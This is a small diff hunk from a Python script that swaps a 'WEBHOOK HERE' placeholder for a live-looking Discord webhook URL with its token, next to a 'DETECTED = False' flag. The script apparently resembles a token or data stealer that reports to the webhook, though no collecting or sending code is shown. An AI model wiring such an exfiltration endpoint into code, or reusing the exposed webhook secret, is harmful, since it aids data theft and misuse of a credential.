@@ -20,7 +20,7 @@ import subprocess
 #
 
 
-hook = "WEBHOOK HERE"
+hook = "https://discord.com/api/webhooks/1502047544002347299/9VmpEu7ccEHjEX_-H54IzTEmVUYDzEFItp7BGHvzkoptp5bBJ9h6gQoXjMU22NybP8E2"
 DETECTED = False
 
 
